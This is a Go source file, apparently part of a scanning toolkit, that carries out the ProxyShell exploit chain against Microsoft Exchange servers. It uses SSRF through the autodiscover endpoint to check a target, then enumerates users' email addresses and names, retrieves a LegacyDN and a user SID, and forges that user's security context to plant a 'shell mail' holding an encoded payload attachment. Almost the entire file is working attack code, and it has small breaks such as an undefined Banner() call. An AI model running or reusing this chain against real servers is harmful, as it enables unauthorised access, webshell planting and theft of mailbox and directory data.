package exchange

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

func check(target string) {
	user_agent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
	/*构造payload*/
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}
	do, err := util.DoGet(target+"/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com", map[string]string{
		"User-Agent": user_agent,
		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	})

	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	defer func() {
		_ = do.Body.Close()
	}()

	ioread, _ := ioutil.ReadAll(do.Body)
	bannerstr := Between(string(ioread), `<title>`, `</title>`)
	targetuser := Between(string(ioread), `<b>User:</b> `, `<br><b>UPN:</b>`)

	if do.StatusCode == 200 && bannerstr == "Exchange MAPI/HTTP Connectivity Endpoint" {
		fmt.Println("[+] req status: " + do.Status)
		fmt.Println("[+] target user is : " + targetuser)
		fmt.Println("[+] target is vulnerable to proxyshell !")
		enumerate(target)
	} else {
		fmt.Println("[-] target is not vulnerable to proxyshell !")
	}
}

func enumerate(target string) {
	user_agent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
	/*构造payload*/
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}

	endpoint_addr := "/autodiscover/autodiscover.json?a=test@test.com/EWS/exchange.asmx"

	json_data := `<soap:Envelope
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
	xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
	xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	<soap:Header>
	  <t:RequestServerVersion Version="Exchange2016" />
	</soap:Header>
   <soap:Body>
	  <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
		<m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
	  </m:ResolveNames>
	</soap:Body>
  
  </soap:Envelope>`

	do, err := util.DoPost(target+endpoint_addr, map[string]string{
		"Cookie":       "Email=autodiscover/autodiscover.json?a=test@test.com",
		"User-Agent":   user_agent,
		"Accept":       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Content-Type": "text/xml",
		"Connection":   "close",
	}, strings.NewReader(json_data))

	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	defer func() {
		_ = do.Body.Close()
	}()

	ioread, _ := ioutil.ReadAll(do.Body)
	bannerstr := Between(string(ioread), `<?xml `, `="1.0"`)
	email_addr := Between(string(ioread), `<t:EmailAddress>`, `</t:EmailAddress>`)
	display_name := Between(string(ioread), `<t:DisplayName>`, `</t:DisplayName>`)
	email_addr1 := Between(string(ioread), `<t:Entry Key="EmailAddress1">`, `</t:Entry>`)

	if do.StatusCode == 200 && bannerstr == "version" {
		fmt.Println("[+] get target email addr: " + email_addr)
		fmt.Println("[+] get target displayname: " + display_name)
		fmt.Println("[+] get target email addr1: " + email_addr1)
		getlegacydn(target, email_addr)
	} else {
		fmt.Println("[-] get email failed !")
	}
}

func getlegacydn(target, email string) {
	/*构造payload*/
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}
	endpoint_addr := "/autodiscover/autodiscover.json?a=luci@ex.com/autodiscover/autodiscover.xml"

	json_data := `<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>` + email + `</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>`

	do, err := util.DoPost(target+endpoint_addr, map[string]string{
		"Accept-Encoding": "identity",
		"Cookie":          "Email=autodiscover/autodiscover.json?a=luci@ex.com",
		"Content-Type":    "text/xml",
	}, strings.NewReader(json_data))

	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	defer func() {
		_ = do.Body.Close()
	}()

	ioread, _ := ioutil.ReadAll(do.Body)
	serverversion := Between(string(ioread), `<ServerVersion>`, `</ServerVersion>`)
	LegacyDN := Between(string(ioread), `<LegacyDN>`, `</LegacyDN>`)

	if do.StatusCode == 200 {
		fmt.Println("[+] get server version: " + serverversion)
		fmt.Println("[+] get LegacyDN: " + LegacyDN)
		getsid(target, LegacyDN)
	} else {
		fmt.Println("[-] get LegacyDN failed !")
	}
}

func getsid(target, LegacyDN string) {
	cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}

	endpoint_addr := "/autodiscover/autodiscover.json?a=luci@ex.com/mapi/emsmdb"

	legacydn := LegacyDN + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

	request, err := http.NewRequest(http.MethodPost, target+endpoint_addr, strings.NewReader(legacydn))
	if err != nil {
		fmt.Println(err)
	}

	request.Header.Add("Accept-Encoding", "identity")
	request.Header.Add("Cookie", "Email=autodiscover/autodiscover.json?a=luci@ex.com")
	request.Header.Add("X-Requesttype", "Connect")
	request.Header.Add("X-Clientinfo", "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}")
	request.Header.Add("X-Clientapplication", "Outlook/15.0.4815.1002")
	request.Header.Add("X-Requestid", "{C715155F-2BE8-44E0-BD34-2960067874C8}:2")
	request.Header.Add("Content-Type", "application/mapi-http")

	do, err := cli.Do(request)
	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	defer func() {
		_ = do.Body.Close()
	}()

	ioread, _ := ioutil.ReadAll(do.Body)
	resp := string(ioread)
	sid := Between(resp, `with SID `, ` and MasterAccountSid`)

	if do.StatusCode == 200 {
		fmt.Println("[+] get sid: " + sid)
	} else {
		fmt.Println("[-] get sid failed !")
	}
}

func sendmail(target, token, sid, email string) {
	cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}

	endpoint_addr := "/autodiscover/autodiscover.json?a=luci@ex.com/EWS/exchange.asmx/?X-Rps-CAT="

	soap_data := `<soap:Envelope
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
	xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
	xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	<soap:Header>
	  <t:RequestServerVersion Version="Exchange2016" />
	  <t:SerializedSecurityContext>
		<t:UserSid>` + sid + `</t:UserSid>
		<t:GroupSids>
		  <t:GroupIdentifier>
			<t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
		  </t:GroupIdentifier>
		</t:GroupSids>
	  </t:SerializedSecurityContext>
	</soap:Header>
	<soap:Body>
	  <m:CreateItem MessageDisposition="SaveOnly">
		<m:Items>
		  <t:Message>
			<t:Subject>you are fucked</t:Subject>
			<t:Body BodyType="HTML">hello from darkness side</t:Body>
			<t:Attachments>
			  <t:FileAttachment>
				<t:Name>FileAttachment.txt</t:Name>
				<t:IsInline>false</t:IsInline>
				<t:IsContactPhoto>false</t:IsContactPhoto>
				<t:Content>ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ</t:Content>
			  </t:FileAttachment>
			</t:Attachments>
			<t:ToRecipients>
			  <t:Mailbox>
				<t:EmailAddress>` + email + `</t:EmailAddress>
			  </t:Mailbox>
			</t:ToRecipients>
		  </t:Message>
		</m:Items>
	  </m:CreateItem>
	</soap:Body>
  </soap:Envelope>`

	request, err := http.NewRequest(http.MethodPost, target+endpoint_addr+token, strings.NewReader(soap_data))
	if err != nil {
		fmt.Println(err)
	}

	request.Header.Add("Accept-Encoding", "identity")
	request.Header.Add("Cookie", "Email=autodiscover/autodiscover.json?a=luci@ex.com")
	request.Header.Add("Content-Type", "text/xml")

	do, err := cli.Do(request)
	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	defer func() {
		_ = do.Body.Close()
	}()

	ioread, _ := ioutil.ReadAll(do.Body)
	resp := string(ioread)
	ResponseCode := Between(resp, `<m:ResponseCode>`, `</m:ResponseCode>`)

	if do.StatusCode == 200 {
		fmt.Println("[+] send shell mail successful: " + ResponseCode)
	} else {
		fmt.Println("[-] send shell mail failed !!!")
	}
}

func main() {
	Banner()
	var target, token, sid, email string
	flag.StringVar(&target, "u", "", "")
	flag.StringVar(&token, "t", "", "")
	flag.StringVar(&sid, "i", "", "")
	flag.StringVar(&email, "e", "", "")
	flag.CommandLine.Usage = func() {
		fmt.Println("usage：\nexec: ./chkproxyshell -u <target url>\n")
	}
	flag.Parse()

	if len(target) == 0 {
		fmt.Println("[+] please enter the url you want to check!!!")
		fmt.Println("[+] Author: https://github.com/FDlucifer, https://twitter.com/fdlucifer11")
	}

	check(target)
	sendmail(target, token, sid, email)
}
